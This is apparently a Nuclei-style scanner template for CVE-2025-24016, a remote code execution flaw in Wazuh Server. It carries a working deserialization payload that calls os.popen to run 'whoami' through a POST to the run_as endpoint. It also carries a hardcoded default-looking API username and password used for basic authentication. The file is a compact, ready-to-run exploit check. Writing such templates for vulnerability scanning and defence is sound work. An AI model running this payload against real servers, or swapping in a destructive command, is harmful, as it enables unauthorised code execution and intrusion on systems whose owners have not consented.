id: wazuh-rce

info:
  name: Wazuh RCE (CVE-2025-24016)
  author: Andrei
  severity: critical
  description: "Wazuh Server is vulnerable to remote code execution via improper handling of JSON objects."
  reference:
    - https://github.com/wazuh/wazuh/security/advisories/GHSA-hcrc-79hj-m3qh
  tags: wazuh,rce,cve,cve-2025-24016

variables:
  username: "wazuh-wui"
  password: "MyS3cr37P450r.*-"
  payload: '{"__unhandled_exc__": {"__class__": "os.popen", "__args__": ["whoami"], "__returns__": "output"}}'

requests:
  - method: POST
    path:
      - "{{BaseURL}}/security/user/authenticate/run_as"
    headers:
      Content-Type: application/json
      X-Header-Name: Custom-Header
    body: "{{payload}}"
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Success Authentication!"
        part: body

  - method: GET
    path:
      - "{{BaseURL}}/security/user/info"
    matchers:
      - type: word
        words:
          - "wazuh"
        part: body

auth:
  - type: basic
    username: "{{username}}"
    password: "{{password}}"
